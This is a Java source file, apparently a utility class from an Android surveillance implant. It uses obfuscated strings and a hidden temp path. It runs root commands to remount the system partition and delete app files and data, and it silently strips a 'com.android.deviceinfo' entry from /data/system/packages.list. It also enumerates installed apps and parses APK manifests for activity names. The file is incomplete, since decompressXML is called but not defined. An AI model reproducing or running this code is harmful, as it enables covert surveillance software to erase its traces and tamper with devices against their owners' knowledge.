package com.android.dvci.util;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.util.Log;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.Configuration;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.mm.M;

import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.xml.sax.InputSource;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.StringReader;
import java.io.Writer;
import java.nio.channels.FileChannel;
import java.util.ArrayList;
import java.util.List;
import java.util.jar.JarFile;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;


public class PackageUtils {
	
	private static final String TAG = "PackageUtils"; 

	public static boolean replaceInFile(String file, String matchRegExp, String replaceRegExp, String replace) {
		
		
		
		
		
		
		
		
		
		

		File fs = new File(file);
		

		Boolean matchFound = false;
		Writer writer = null;
		BufferedReader fileReader = null;
		AutoFile tmpLocal = new AutoFile(Path.hidden(), Utils.getRandom() + ".t");

		try {
			fileReader = new BufferedReader(new InputStreamReader(new FileInputStream(fs.getAbsolutePath())));
			if (tmpLocal.exists()) {
				tmpLocal.delete();
			}

			writer = new BufferedWriter(new FileWriter(tmpLocal.getFile()));
			String lineContents;
			int offset = 0;
			Pattern pattern = Pattern.compile(matchRegExp);
			while ((lineContents = fileReader.readLine()) != null) {
				Matcher matcher = pattern.matcher(lineContents);
				String lineByLine = null;
				if (matcher.matches()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(replaceInFile): match'" + lineContents + "' line offsets:" + offset);
					}
					if (replace != null) {
						lineByLine = lineContents.replaceAll((replaceRegExp != null) ? replaceRegExp : matchRegExp, replace);
						if (Cfg.DEBUG) {
							Check.log(TAG + "(replaceInFile): replaced with:'" + lineByLine + "'");
						}
						writer.write(lineByLine + "\n");
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + "(replaceInFile): deleted");
						}
					}
					matchFound = true;

				} else {
					writer.write(lineContents + "\n");
				}
				offset += lineContents.length();
			}
			fileReader.close();
			writer.close();
			if (matchFound) {

				try {
					FileChannel source = null;
					FileChannel destination = null;
					FileInputStream fsource = new FileInputStream(tmpLocal.getFile());
					source = fsource.getChannel();
					FileOutputStream fdestination = new FileOutputStream(fs);
					destination = fdestination.getChannel();
					destination.transferFrom(source, 0, source.size());
					if (source != null) {
						source.close();
						fsource.close();
					}
					if (destination != null) {
						destination.close();
						fdestination.close();
					}
				} catch (IOException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (replaceInFile): trasferForm, error: " + e);
					}
					return false;
				}
				return true;
			}
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(replaceInFile):openCopy, error: " + e);
			}
		} finally {
			if (writer != null) {
				try {
					writer.close();
				} catch (IOException e) {
				}
			}

			if (fileReader != null) {
				try {
					fileReader.close();
				} catch (IOException e) {
				}
			}

			tmpLocal.delete();

		}
		return false;
	}

	
	public static class PInfo {
		
		private String appname = ""; 

		
		private String pname = ""; 

		
		private String versionName = ""; 

		
		private String apkPath = ""; 

		
		private int versionCode = 0;

		
		@Override
		public String toString() {
			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode; 
		}
	}


	public static boolean uninstallApk(String apk) {
		boolean found = isInstalledApk(apk);
		if (!found) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (uninstallApk), cannot find APK");
			}
			return false;
		}

		remountSystem(true);
		removeAdmin(apk);
		removePackageList(apk);
		removeFiles(apk);
		remountSystem(false);

		killApk(apk);

		return true;
	}

	private static void killApk(String apk) {
		
	}

	private static void removePackageList(String apk) {
		
		
		replaceInFile("/data/system/packages.list", ".*com.android.deviceinfo.*",null,null);
	}

	private static void removeAdmin(String apk) {
		


	}

	private static void removeFiles(String apk) {
		Execute.executeRoot(M.e("rm /data/app/") + apk + M.e("*.apk"));
		Execute.executeRoot(M.e("rm -r /data/data/") + apk);

	}

	private static void remountSystem(boolean rw) {
		if (rw) {
			Execute.execute(Configuration.shellFile + M.e(" blw"));
		} else {
			Execute.execute(Configuration.shellFile + M.e(" blr"));
		}
	}

	private static boolean isInstalledApk(String apk) {
		boolean found = false;
		ArrayList<PInfo> l = getInstalledApps(false);
		for (PInfo p : l) {
			if (p.pname.equals(apk)) {
				found = true;
				break;
			}
		}
		return found;
	}

	
	public static ArrayList<PInfo> getInstalledApps(final boolean getSysPackages) {
		final ArrayList<PInfo> res = new ArrayList<PInfo>();
		final PackageManager packageManager = Status.getAppContext().getPackageManager();

		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);

		String k = M.e("keyguard");
		for (int i = 0; i < packs.size(); i++) {
			final PackageInfo p = packs.get(i);

			if ((!getSysPackages) && (p.versionName == null)) {
				continue;
			}

			try {
				final PInfo newInfo = new PInfo();
				newInfo.pname = p.packageName;
				if (!newInfo.pname.contains(k)) {
					newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
				}
				newInfo.versionName = p.versionName;
				newInfo.versionCode = p.versionCode;
				newInfo.apkPath = p.applicationInfo.sourceDir;
				res.add(newInfo);
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getInstalledApps) Error: " + e);
				}
			}
		}

		return res;
	}

	
	private ArrayList<PInfo> getPackages() {
		final ArrayList<PInfo> apps = getInstalledApps(false);
		final int max = apps.size();

		for (int i = 0; i < max; i++) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + apps.get(i).toString());
			}
		}

		return apps;
	}
	
	public static int endDocTag = 0x00100101;
	
	public static int startTag =  0x00100102;
	
	public static int endTag =    0x00100103;
	
	public static String spaces = "                                             ";

		// TODO



	
	public static String compXmlString(byte[] xml, int sitOff, int stOff, int strInd) {
		if (strInd < 0) return null;
		int strOff = stOff + LEW(xml, sitOff+strInd*4);
		return compXmlStringAt(xml, strOff);
	}
	public static Document loadXMLFromString(String xml) throws Exception
	{
		DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
		DocumentBuilder builder = factory.newDocumentBuilder();
		InputSource is = new InputSource(new StringReader(xml));
		return builder.parse(is);
	}

	
	public static String prtIndent(int indent, String str) {
		return (spaces.substring(0, Math.min(indent*2, spaces.length()))+str);
	}

	
	public static String compXmlStringAt(byte[] arr, int strOff) {
		int strLen = arr[strOff+1]<<8&0xff00 | arr[strOff]&0xff;
		byte[] chars = new byte[strLen];
		for (int ii=0; ii<strLen; ii++) {
			chars[ii] = arr[strOff+2+ii*2];
		}
		return new String(chars);  
	} 


	
	public static int LEW(byte[] arr, int off) {
		return arr[off+3]<<24&0xff000000 | arr[off+2]<<16&0xff0000
				| arr[off+1]<<8&0xff00 | arr[off]&0xFF;
	} 

	public static ArrayList<String> getActivitisFromApk(String apk){
		ArrayList<String> activityList = null;
		if (new AutoFile(apk).exists()) {
			try {

				JarFile jf = new JarFile(apk);
				InputStream is = jf.getInputStream(jf.getEntry(M.e("AndroidManifest.xml")));
				byte[] xml = new byte[is.available()];
				int br = is.read(xml);
				String text = M.e("<?xml version=\"1.0\" encoding=\"utf-8\"?>")+"\n";
				text += decompressXML(xml);
				Document doc = loadXMLFromString(text);
				if (doc == null) {
					return null;
				}
				int nLen = doc.getElementsByTagName(M.e("activity")).getLength();
				for (int n = 0; n < nLen; n++) {
					Node activity = doc.getElementsByTagName(M.e("activity")).item(n);
					if (activity.getAttributes().getNamedItem(M.e("name")) != null) {
						if (activityList == null) {
							activityList = new ArrayList<String>();
						}
						activityList.add(activity.getAttributes().getNamedItem(M.e("name")).getNodeValue());
					}
				}

			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(getActivitis): exception: " + ex);
				}
			}
		}
		return activityList;
	}
}
